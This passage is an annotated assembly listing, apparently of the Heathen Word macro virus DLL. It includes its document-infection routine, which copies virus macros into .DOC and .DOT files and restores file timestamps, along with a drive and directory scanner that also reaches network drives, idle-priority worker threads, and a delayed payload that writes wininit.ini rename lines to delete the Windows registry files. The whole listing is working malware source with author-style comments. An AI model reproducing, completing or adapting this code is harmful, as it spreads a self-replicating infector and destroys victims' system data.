  push	0	    ; zero (reserved)
  push	offset xTable ;	name of	stream:	"0Table" or "1Table"
  mov	ecx, [ebp+IStorage1]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStorage_Interface.OpenStream] ; open stream
  test	eax, eax
  jnz	error73
  push	1	    ; STGMOVE_COPY (we want a copy!)
  push	offset aMacros ; name of element in destination
  push	[ebp+IStorage1]	; destination IStorage object (the document to be infected!)
  push	offset aMacros ; name of element to be moved
  mov	edx, ds:IStorage ; source IStorage (Heathen.vdo)
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStorage_Interface.MoveElementTo] ; copy macros!
  test	eax, eax
  jnz	error74	    ; exit on error
  mov	dword ptr [ebp+SeekOffset], 0
  mov	dword ptr [ebp+SeekOffset+4], 0
  lea	eax, [ebp+MacrosOffset]	; here will be returned	end of xTable, where virus will	copy its macros
  push	eax
  push	2	    ; STREAM_SEEK_END
  push	dword ptr [ebp+SeekOffset+4]
  push	dword ptr [ebp+SeekOffset]
  mov	ecx, [ebp+IStream2]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Seek] ; seek to end of stream xTable
  push	0
  push	0
  push	dword ptr ds:HeathenMacrosSize+4
  push	dword ptr ds:HeathenMacrosSize ; size of virus macros (that were stored	in WordDocument	stream of Heathen.vdo)
  push	[ebp+IStream2] ; destination Stream (xTable stream of document to be infected!)
  mov	ecx, ds:IStream	; source stream	(WordDocument of Heathen.vdo, where virus macros are stored!!!))
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.CopyTo] ; copy virus macros at end of xTable
  test	eax, eax
  jnz	short error75
  mov	edx, [ebp+MacrosOffset]	; EDX =	offset of macros in xTable
  mov	ecx, dword ptr ds:HeathenMacrosSize ; ECX = size of macros
  mov	dword ptr [ebp+Buffer+15Ah], edx ; fcCmds = offset in xTable stream of macros
  mov	dword ptr [ebp+Buffer+15Eh], ecx ; lcbCmds = size of macros
  push	0	    ; NULL (dont return	new position)
  push	0	    ; STREAM_SEEK_SET
  push	dword ptr [ebp+SeekOffset+4] ; NULL
  push	dword ptr [ebp+SeekOffset] ; NULL
  mov	edx, [ebp+IStream1]
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStream_Interface.Seek] ; set stream pointer to beginning of WordDocument
  push	0
  lea	eax, [ebp+Buffer]
  push	200h	    ; size of Header
  push	eax
  mov	edx, [ebp+IStream1]
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStream_Interface.Write] ;	write WordDocument Header
  mov	esi, 1

error75:
  push	0	    ; NULL (dont return	new position)
  push	0	    ; STREAM_SEEK_SET
  push	dword ptr [ebp+SeekOffset+4]
  push	dword ptr [ebp+SeekOffset]
  mov	edx, ds:IStream
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStream_Interface.Seek] ; set stream pointer to beggining of WordDocument stream in Heathen.vdo

error74:
  mov	eax, [ebp+IStream2]
  push	eax
  mov	edx, [eax]
  call	[edx+IStream_Interface.Release]	; close	stream xTable

error73:
  mov	ecx, [ebp+IStream1]
  push	ecx
  mov	eax, [ecx]
  call	[eax+IStream_Interface.Release]	; close	stream WordDocument (of	infected document)

error72:
  mov	edx, [ebp+IStorage1]
  push	edx
  mov	ecx, [edx]
  call	[ecx+IStorage_Interface.Release] ; close IStorage object (infected document)
  test	esi, esi
  jz	short error71 ;	exit if	infection was not successful
  push	0	    ; NULL
  push	0	    ; NULL
  push	3	    ; CREATE_ALWAYS
  push	0	    ; NULL = file cannot be inherited
  push	0	    ; 0	= prevent file from being shared
  push	40000000h   ; GENERIC_WRITE
  push	ebx
  call	API_CreateFileA	; open document	file
  mov	ebx, eax
  lea	eax, [ebp+STATG.mtime]
  push	eax
  lea	edx, [ebp+STATG.atime]
  push	edx
  lea	ecx, [ebp+STATG.ctime]
  push	ecx
  push	ebx
  call	API_SetFileTime	; restore filetime
  push	ebx
  call	API_CloseHandle	; close	file handle

error71:
  mov	eax, esi

error70:
  pop	esi
  pop	ebx
  mov	esp, ebp
  pop	ebp
  retn
InfectDocument endp


; --------------- S U B	R O U T	I N E ---------------------------------------


SearchDirectories proc near

RootPathName= byte ptr -724h
DocumentName= byte ptr -71Ch
DirectoryName= byte ptr	-5F0h
File_Search_Pattern= byte ptr -4C4h
WIN32_FIND_DATA= WIN32_FIND_DATA_STRUC ptr -398h
SubdirectoryName= byte ptr -258h
FileName= byte ptr -12Ch

  push	ebx
  push	esi
  add	esp, 0FFFFF8DCh
  cmp	ds:DirectoryList.NextDirectorySTRUC, 0 ; end of	directories?
  lea	esi, [esp+724h+WIN32_FIND_DATA]	; ESI =	WIN32_FIND_DATA
  jz	short directories_end ;	yes, no	more directories
  lea	eax, [esp+724h+DocumentName]
  push	eax
  push	offset DirectoryList.NextDirectorySTRUC	; next directory
  call	DeleteDirectoryfromList	; get next document to infect and free it from List
  add	esp, 8
  lea	edx, [esp+724h+DocumentName]
  push	edx
  call	InfectDocument ; infect	document (unless its a directory name)
  pop	ecx
  mov	eax, 1
  jmp	error80
; ---------------------------------------------------------------------------

directories_end:
  cmp	ds:DirectoryList.DirectoryName,	0 ; finished all directories of	current	drive in ScanData list?
  jnz	short Search_Documents ; not yet
  call	API_GetLogicalDrives ; get info	on logical drives (bits	in EAX set to one)

invalid_drive:
  inc	ds:Drive    ; next drive
  cmp	ds:Drive, 1Ah ;	'Z'?
  jle	short CheckDrive
  xor	edx, edx
  mov	ds:Drive, edx ;	scan again all drives!

CheckDrive:
  cmp	ds:Drive, 2 ; (2 = C:)
  jl	short invalid_drive ; drives A:	and B: will not	be infected!
  mov	ecx, ds:Drive
  mov	edx, 1
  shl	edx, cl
  test	edx, eax
  jz	short invalid_drive ; drive not	present!
  push	offset aRoot
  lea	eax, [esp+728h+RootPathName]
  push	eax
  call	API_lstrcpyA ; "A:"
  mov	cl, byte ptr ds:Drive
  add	[esp+724h+RootPathName], cl ; set drive	letter
  push	esp	    ; &RootPathName
  call	API_GetDriveTypeA ; get	info on	logical	drive
  test	eax, eax    ; DRIVE_UNKNOWN
  jz	short Add_Drive_Path
  cmp	eax, 3	    ; DRIVE_FIXED
  jz	short Add_Drive_Path
  cmp	eax, 4	    ; DRIVE_REMOTE
  jnz	short Continue_Later ; exit with error free (will continue later!)

Add_Drive_Path:
  push	esp	    ; &RootPathName
  push	offset DirectoryList
  call	AddDirectorytoList ; add root directory	to List
  add	esp, 8
  jmp	error80
; ---------------------------------------------------------------------------

Continue_Later:
  mov	eax, 1	    ; EAX != 0 --> no errors
  jmp	error80
; ---------------------------------------------------------------------------

Search_Documents:
  lea	edx, [esp+724h+DirectoryName]
  push	edx
  push	offset DirectoryList
  call	DeleteDirectoryfromList	; get a	directory from list to search files (and free it from list)
  add	esp, 8
  lea	ecx, [esp+724h+DirectoryName] ;	path to	search files
  push	ecx
  push	offset aSearchPattern
  lea	eax, [esp+72Ch+File_Search_Pattern]
  push	eax
  call	API_wsprintfA ;	"drive:directory*.*"
  add	esp, 0Ch
  push	esi	    ; ESI = WIN32_FIND_DATA
  lea	edx, [esp+728h+File_Search_Pattern]
  push	edx
  call	API_FindFirstFileA ; find files!
  mov	ebx, eax
  cmp	ebx, 0FFFFFFFFh
  jz	error81	    ; error

Check_File:
  test	byte ptr [esi+WIN32_FIND_DATA_STRUC.dwFileAttributes], 10h ; FILE_ATTRIBUTE_DIRECTORY?
  jz	short File_Found
  push	offset a__
  lea	eax, [esi+WIN32_FIND_DATA_STRUC.cFileName]
  push	eax
  call	API_lstrcmpA
  test	eax, eax
  jz	short File_Found ; jump	if ".."
  push	offset a_
  lea	edx, [esi+WIN32_FIND_DATA_STRUC.cFileName]
  push	edx
  call	API_lstrcmpA
  test	eax, eax
  jz	short File_Found ; jump	if "."
  lea	ecx, [esi+WIN32_FIND_DATA_STRUC.cFileName]
  push	ecx	    ; name of found subdirectory
  lea	eax, [esp+728h+DirectoryName]
  push	eax
  push	offset aSS1 ; "%s%s"
  lea	edx, [esp+730h+SubdirectoryName]
  push	edx
  call	API_wsprintfA ;	"drive:directorysubdirectory"
  add	esp, 10h
  lea	ecx, [esp+724h+SubdirectoryName]
  push	ecx
  push	offset DirectoryList
  call	AddDirectorytoList ; add it to List
  add	esp, 8
  test	eax, eax
  jnz	short Search_More_Files	; search more files
  xor	eax, eax    ; error
  jmp	error80
; ---------------------------------------------------------------------------
  jmp	short Search_More_Files
; ---------------------------------------------------------------------------

File_Found:
  lea	edx, [esi+WIN32_FIND_DATA_STRUC.cFileName]
  push	edx
  call	UpperCase   ; convert all letters to uppercase
  pop	ecx
  xor	eax, eax    ; EAX = index in filename
  jmp	short Check_File2
; ---------------------------------------------------------------------------

search_end_of_filename:
  inc	eax

Check_File2:
  cmp	[esi+eax+WIN32_FIND_DATA_STRUC.cFileName], 0
  jnz	short search_end_of_filename ; get to end of filename
  lea	edx, [esi+WIN32_FIND_DATA_STRUC.dwReserved1]
  add	eax, edx    ; EAX = pointer to 4 bytes before end of filename
  mov	edx, [eax]
  cmp	edx, 434F442Eh ; ".DOC"
  jz	short Target_Extensions
  cmp	edx, 544F442Eh ; ".DOT"
  jnz	short Search_More_Files

Target_Extensions:
  lea	eax, [esi+WIN32_FIND_DATA_STRUC.cFileName]
  push	eax
  lea	ecx, [esp+728h+DirectoryName]
  push	ecx
  push	offset aSS2
  lea	eax, [esp+730h+FileName]
  push	eax
  call	API_wsprintfA ;	"drive:directorydocument"
  add	esp, 10h
  lea	edx, [esp+724h+FileName]
  push	edx
  push	offset DirectoryList.NextDirectorySTRUC
  call	AddDirectorytoList ; add document to List
  add	esp, 8
  test	eax, eax
  jnz	short Search_More_Files
  xor	eax, eax    ; error
  jmp	short error80
; ---------------------------------------------------------------------------

Search_More_Files:
  push	esi
  push	ebx
  call	API_FindNextFileA ; search more	files/subdirectories
  test	eax, eax
  jnz	Check_File  ; check this file
  push	ebx
  call	API_FindClose ;	close search handle

error81:
  mov	eax, 1	    ; means error free	 :-)

error80:
  add	esp, 724h   ; (EAX = 0 --> some	error occured)
  pop	esi
  pop	ebx
  retn
SearchDirectories endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

THREAD2_EntryPoint proc near
  push	ebp
  mov	ebp, esp

continue_search:
  call	SearchDirectories
  test	eax, eax
  jz	short error30 ;	EAX=0 means that some error occured
  push	3E8h	    ; timeout interval=1000 miliseconds	= 1 second
  push	ds:EventHandle
  call	API_WaitForSingleObject	; wait for the event to	be signaled
  cmp	eax, 102h   ; WAIT_TIMEOUT?
  jz	short continue_search ;	in case	of timeout, repeat process. Else finish	thread.

error30:
  xor	eax, eax
  pop	ebp
  retn	4	    ; exit thread
THREAD2_EntryPoint endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

WndProc proc near

HWND= dword ptr	 8
UINT= dword ptr	 0Ch
WPARAM=	dword ptr  10h
LPARAM=	dword ptr  14h

  push	ebp
  mov	ebp, esp
  mov	edx, [ebp+WPARAM] ; wparam
  mov	eax, [ebp+UINT]	; message identifier
  mov	ecx, eax
  sub	ecx, 16h    ; WM_ENDSESSION  informs the application whether the Windows session is ending)
  jnz	short calldefaultWndProc ; go to default WndProc, unless WM_ENDSESSION is received
  test	edx, edx
  jz	short messageprocessed ; wparam=FALSE=session is NOT being ended
  push	ds:EventHandle
  call	API_SetEvent ; set state of event object as signaled, so API WaitSingleObject returns!
  push	0FFFFFFFFh
  push	ds:Thread2_Handle
  call	API_WaitForSingleObject	; wait to signaled state of the	Thread2, that is, when thread finishes
  call	UpdateScanData ; write to disk the list	of currently scanned directories
  mov	eax, ds:IStream
  push	eax
  mov	edx, [eax]
  call	[edx+IStream_Interface.Release]	; close	stream WordDocument (OnILockBytes)
  mov	eax, ds:IStorage
  push	eax
  mov	edx, [eax]
  call	[edx+IStorage_Interface.Release] ; close IStorage (OnIlockBytes)
  mov	ecx, ds:ILockBytes
  push	ecx
  mov	eax, [ecx]
  call	[eax+ILockBytes_Interface.Release] ; release ILockBytes	interface
  cmp	ds:MoreThanHalfYear, 0
  jz	short messageprocessed ; skip if less than 183 days since virus	installation
  call	PAYLOAD	    ; lets play	with wininit.ini   :-D
  jmp	short messageprocessed
; ---------------------------------------------------------------------------

calldefaultWndProc:
  push	[ebp+LPARAM] ; lparam
  push	edx	    ; wparam
  push	eax	    ; uint
  push	[ebp+HWND]  ; hwnd
  call	API_DefWindowProcA ; call default WndProc
  jmp	short Exit_WndProc
; ---------------------------------------------------------------------------

messageprocessed:
  xor	eax, eax    ; indicate that the	message	has been procesed

Exit_WndProc:
  pop	ebp
  retn	10h
WndProc	endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

THREAD1_EntryPoint proc near

Message= dword ptr -48h
WndClass= WNDCLASS_STRUC ptr -2Ch
Thread2_ID= dword ptr -4
DllHandle= dword ptr  8

  push	ebp
  mov	ebp, esp
  add	esp, 0FFFFFFB8h
  push	ebx
  call	InitVariables ;	init some variables and	check date (for	payload)
  test	eax, eax
  jz	Exit_THREAD1 ; exit on error
  push	offset MemoryAllocator
  push	1	    ; must be 1
  call	API_CoGetMalloc	; get IMalloc interface
  call	InitDirectoryList ; initialize directory list
  xor	eax, eax
  xor	edx, edx
  mov	[ebp+WndClass.style], eax
  xor	ecx, ecx
  mov	[ebp+WndClass.lpfnWndProc], offset WndProc
  mov	[ebp+WndClass.cbClsExtra], edx
  mov	[ebp+WndClass.cbWndExtra], ecx
  mov	eax, [ebp+DllHandle] ; argument	given to the thread
  mov	[ebp+WndClass.hInstance], eax
  push	7F00h	    ; IDI_APPLICATION  (default	application icon)
  push	0	    ; NULL
  call	API_LoadIconA ;	return handle to the application icon
  mov	[ebp+WndClass.hIcon], eax
  push	7F00h	    ; IDC_ARROW
  push	0
  call	API_LoadCursorA	; return handle	to the application cursor
  mov	[ebp+WndClass.hCursor],	eax
  push	4	    ; BLACK_BRUSH
  call	API_GetStockObject ; retrieves a handle	to one of the predefined stock pens
  mov	[ebp+WndClass.hbrBackground], eax
  xor	edx, edx
  mov	[ebp+WndClass.lpszMenuName], edx ; NULL=windows	belonging to this class	have no	default	menu
  lea	ecx, [ebp+WndClass] ; address of structure with	class data
  mov	[ebp+WndClass.lpszClassName], offset aHeathenwc	; lpszClassName
  push	ecx
  call	API_RegisterClassA ; registers a window	class for subsequent calls to CreateWindow/CreateWindowEx
  test	ax, ax
  jz	Exit_THREAD1 ; error
  push	0	    ; lpParam=NULL
  push	[ebp+DllHandle]	; application instance
  push	0	    ; NULL
  push	0	    ; NULL
  push	64h	    ; height
  push	64h	    ; width
  push	80000000h   ; CW_USEDEFAULT
  push	80000000h   ; CW_USEDEFAULT
  push	80000000h   ; CW_USEDEFAULT
  push	0
  push	offset aHeathenwc ; pointer to registered class	name
  push	0
  call	API_CreateWindowExA ; create window
  test	eax, eax
  jz	short Exit_THREAD1 ; error
  lea	eax, [ebp+Thread2_ID] ;	&Thread2_ID
  push	eax
  push	4	    ; CREATE_SUSPENDED
  push	0	    ; argument for new thread
  push	offset THREAD2_EntryPoint ; LPTHREAD_START_ROUTINE
  push	10000h	    ; stack size
  push	0	    ; NULL = Thread attributes
  call	API_CreateThread ; create Thread2
  mov	ebx, eax
  mov	ds:Thread2_Handle, ebx ; save thread2 handle
  test	ebx, ebx
  jz	short Exit_THREAD1 ; error
  push	offset aHeathenIsHere ;	event object name
  push	0	    ; Initial State = nonsignaled
  push	1	    ; it requires to manually reset the	state to nonsignaled
  push	0	    ; NULL = handle cannot be inherited
  call	API_CreateEventA ; create an event object
  mov	ds:EventHandle,	eax ; save event handle
  push	0FFFFFFF1h  ; THREAD_BASE_IDLE
  push	ds:Thread2_Handle
  call	API_SetThreadPriority ;	set Thread2 priority
  push	ds:Thread2_Handle
  call	API_ResumeThread ; resume thread! :-)
  jmp	short getmessage
; ---------------------------------------------------------------------------

dispatchmessage:
  lea	eax, [ebp+Message]
  push	eax
  call	API_DispatchMessageA ; dispatch	message

getmessage:
  push	0	    ; wMsgFilterMax=NULL (no range filtering is	performed)
  push	0	    ; wMsgFilterMin=NULL (no range filtering is	performed)
  push	0	    ; NULL=retrieves messages for any window that belongs to the calling thread
  lea	edx, [ebp+Message]
  push	edx
  call	API_GetMessageA	; retrieves a message from the calling thread's message queue and places it in the specified structure
  test	eax, eax
  jnz	short dispatchmessage ;	do it again until the function retrieves the WM_QUIT message

Exit_THREAD1:
  xor	eax, eax
  pop	ebx
  mov	esp, ebp
  pop	ebp
  retn	4	    ; end thread
THREAD1_EntryPoint endp


; --------------- S U B	R O U T	I N E ---------------------------------------

; Attributes: bp-based frame

DllMain proc near

Thread1_ID= byte ptr -4
hinstDLL= dword	ptr  8
fdwReason= dword ptr  0Ch

  push	ebp
  mov	ebp, esp
  push	ecx
  push	ebx
  cmp	[ebp+fdwReason], 1 ; DLL_PROCESS_ATTACH?
  jnz	short exit_Dllmain ; no
  lea	eax, [ebp+Thread1_ID]
  push	eax	    ; &Thread1_ID
  push	4	    ; CREATE_SUSPENDED
  push	[ebp+hinstDLL] ; argument for new thread (=Dll module handle)
  push	offset THREAD1_EntryPoint ; LPTHREAD_START_ROUTINE
  push	10000h	    ; size of stack
  push	0	    ; NULL = thread attributes
  call	API_CreateThread ; create Thread1
  mov	ebx, eax
  test	ebx, ebx
  jz	short exit_Dllmain ; exit on error
  push	0FFFFFFF1h  ; THREAD_BASE_IDLE
  push	ebx	    ; Thread1 handle
  call	API_SetThreadPriority ;	set Thread1 priority
  push	ebx	    ; Thread1 handle
  call	API_ResumeThread ; resume thread! :-)

exit_Dllmain:
  mov	eax, 1	    ; TRUE = DllMain succeeds
  pop	ebx
  pop	ecx
  pop	ebp
  retn	8
DllMain	endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_SetThreadPriority proc near
  jmp	ds:SetThreadPriority
API_SetThreadPriority endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_GetWindowsDirectoryA proc near
  jmp	ds:GetWindowsDirectoryA
API_GetWindowsDirectoryA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_FindNextFileA proc near
  jmp	ds:FindNextFileA
API_FindNextFileA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_CreateEventA proc near
  jmp	ds:CreateEventA
API_CreateEventA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_SetEvent proc near
  jmp	ds:SetEvent
API_SetEvent endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_FindClose proc near
  jmp	ds:FindClose
API_FindClose endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_WaitForSingleObject proc near
  jmp	ds:WaitForSingleObject
API_WaitForSingleObject	endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_GetDriveTypeA proc near
  jmp	ds:GetDriveTypeA
API_GetDriveTypeA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_GetLogicalDrives proc near
  jmp	ds:GetLogicalDrives ; Get bitmask representing
API_GetLogicalDrives endp ; the	currently available disk drives


; --------------- S U B	R O U T	I N E ---------------------------------------


API_FileTimeToSystemTime proc near
  jmp	ds:FileTimeToSystemTime
API_FileTimeToSystemTime endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_CreateFileA proc near
  jmp	ds:CreateFileA
API_CreateFileA	endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_FindFirstFileA proc near
  jmp	ds:FindFirstFileA
API_FindFirstFileA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_SetFileTime proc near
  jmp	ds:SetFileTime
API_SetFileTime	endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_ResumeThread proc near
  jmp	ds:ResumeThread
API_ResumeThread endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_CreateThread proc near
  jmp	ds:CreateThread
API_CreateThread endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_CloseHandle proc near
  jmp	ds:CloseHandle
API_CloseHandle	endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_WriteFile proc near
  jmp	ds:WriteFile
API_WriteFile endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_lstrcatA proc near
  jmp	ds:lstrcatA
API_lstrcatA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_lstrcmpA proc near
  jmp	ds:lstrcmpA
API_lstrcmpA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_lstrcpyA proc near
  jmp	ds:lstrcpyA
API_lstrcpyA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_lstrlenA proc near
  jmp	ds:lstrlenA
API_lstrlenA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_GetSystemTime proc near
  jmp	ds:GetSystemTime
API_GetSystemTime endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_RegisterClassA proc near
  jmp	ds:RegisterClassA
API_RegisterClassA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_LoadIconA proc near
  jmp	ds:LoadIconA
API_LoadIconA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_LoadCursorA proc near
  jmp	ds:LoadCursorA
API_LoadCursorA	endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_GetMessageA proc near
  jmp	ds:GetMessageA
API_GetMessageA	endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_DispatchMessageA proc near
  jmp	ds:DispatchMessageA
API_DispatchMessageA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_DefWindowProcA proc near
  jmp	ds:DefWindowProcA
API_DefWindowProcA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_CreateWindowExA proc near
  jmp	ds:CreateWindowExA
API_CreateWindowExA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_wsprintfA proc near
  jmp	ds:wsprintfA
API_wsprintfA endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_StgOpenStorage proc near
  jmp	ds:StgOpenStorage
API_StgOpenStorage endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_StgCreateDocfileOnILockBytes proc near
  jmp	ds:StgCreateDocfileOnILockBytes
API_StgCreateDocfileOnILockBytes endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_CreateILockBytesOnHGlobal proc near
  jmp	ds:CreateILockBytesOnHGlobal
API_CreateILockBytesOnHGlobal endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_CoGetMalloc proc near
  jmp	ds:CoGetMalloc
API_CoGetMalloc	endp


; --------------- S U B	R O U T	I N E ---------------------------------------


API_GetStockObject proc near
  jmp	ds:GetStockObject
API_GetStockObject endp

; ---------------------------------------------------------------------------
  align	100h
  db 0A00h dup(?)
CODE ends

; Section 2. (virtual address 00003000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000400 (   1024.)
; Offset to raw	data for section: 00001C00
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ---------------------------------------------------------------------------

; Segment type:	Pure data
DATA segment para public 'DATA' use32
  assume cs:DATA
  ;org 403000h
aGetWindowsDirectoryA db 'GetWindowsDirectoryA',0
aCopyFileA db 'CopyFileA',0
DeleteFileA db 'DeleteFileA',0
aCreateFileA db 'CreateFileA',0
aReadFile db 'ReadFile',0
aWriteFile db 'WriteFile',0
aCloseHandle db 'CloseHandle',0
aSetFilePointer db 'SetFilePointer',0
aGetFileTime db 'GetFileTime',0
aSetFileTime db 'SetFileTime',0
alstrcatA db 'lstrcatA',0
alstrcpyA db 'lstrcpyA',0
alstrcmpA db 'lstrcmpA',0
alstrlenA db 'lstrlenA',0
aStgOpenStorage db 'StgOpenStorage',0
aStgCreateDocfile db 'StgCreateDocfile',0
aCoGetMalloc db 'CoGetMalloc',0
aLoadLibraryA db 'LoadLibraryA',0
aKernel32_dll db 'KERNEL32.DLL',0
aHtmp_doc db 'Htmp.doc',0
aExplorer_exe db 'Explorer.exe',0
aHeathen_vex db 'Heathen.vex',0
aHeathen_vdl db 'Heathen.vdl',0
aHeathen_vdo db 'Heathen.vdo',0
aWininit_ini db 'Wininit.ini',0
aRename db '[rename]',0Dh,0Ah,0
aWorddocument:
  unicode 0, <WordDocument>,0
xTable:
  unicode 0, <xTable>,0
aMacros:
  unicode 0, <Macros>,0
aScandata:
  unicode 0, <ScanData>,0
aHeathenwc db 'HeathenWC',0
aHeathenIsHere db 'Heathen is here',0
aRename2 db '%snul=%sSystem.dat',0Dh,0Ah
  db 'nul=%sUser.dat',0Dh,0Ah
  db 'nul=%sSystem.da0',0Dh,0Ah
  db 'nul=%sUser.da0',0
aRoot db 'A:',0
aSearchPattern db '%s*.*',0
a__ db '..',0
a_ db '.',0
aSS1 db '%s%s',0
aSS2 db '%s%s',0
  db	0 ;
MemoryAllocator dd 0
DirectoryList dd 0              ; DirectoryName
  dd 0		    ; NextDirectorySTRUC
WindowsDirectory db 12Ch dup(0)
ILockBytes dd 0
IStorage dd 0
		    ; IStorage del heathen.vdo
IStream dd 0
HeathenMacrosSize dq 0
UNICODE_HeathenVDO db 258h dup(0)
Drive dd ?
MoreThanHalfYear dd ?
may14h dd ?
EventHandle dd ?
Thread2_Handle dd ?
  align	1000h
DATA ends

;
; Imports from KERNEL32.dll
;
; Section 3. (virtual address 00004000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000600 (   1536.)
; Offset to raw	data for section: 00002000
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; ---------------------------------------------------------------------------

; Segment type:	Externs
; _idata
  extrn SetThreadPriority:dword
  extrn GetWindowsDirectoryA:dword
  extrn FindNextFileA:dword
  extrn CreateEventA:dword
  extrn SetEvent:dword
  extrn FindClose:dword
  extrn WaitForSingleObject:dword
  extrn GetDriveTypeA:dword
  extrn GetLogicalDrives:dword
		    ; Get bitmask representing
		    ; the currently available disk drives
  extrn FileTimeToSystemTime:dword
  extrn CreateFileA:dword
  extrn FindFirstFileA:dword
  extrn SetFileTime:dword
  extrn ResumeThread:dword
  extrn CreateThread:dword
  extrn CloseHandle:dword
  extrn WriteFile:dword
  extrn lstrcatA:dword
  extrn lstrcmpA:dword
  extrn lstrcpyA:dword
  extrn lstrlenA:dword
  extrn GetSystemTime:dword

;
; Imports from USER32.dll
;
  extrn RegisterClassA:dword
  extrn LoadIconA:dword
  extrn LoadCursorA:dword
  extrn GetMessageA:dword
  extrn DispatchMessageA:dword
  extrn DefWindowProcA:dword
  extrn CreateWindowExA:dword
  extrn wsprintfA:dword

;
; Imports from OLE32.dll
;
  extrn StgOpenStorage:dword
  extrn StgCreateDocfileOnILockBytes:dword
  extrn CreateILockBytesOnHGlobal:dword
  extrn CoGetMalloc:dword

;
; Imports from GDI32.dll
;
  extrn GetStockObject:dword



  end DLL_EntryPoint
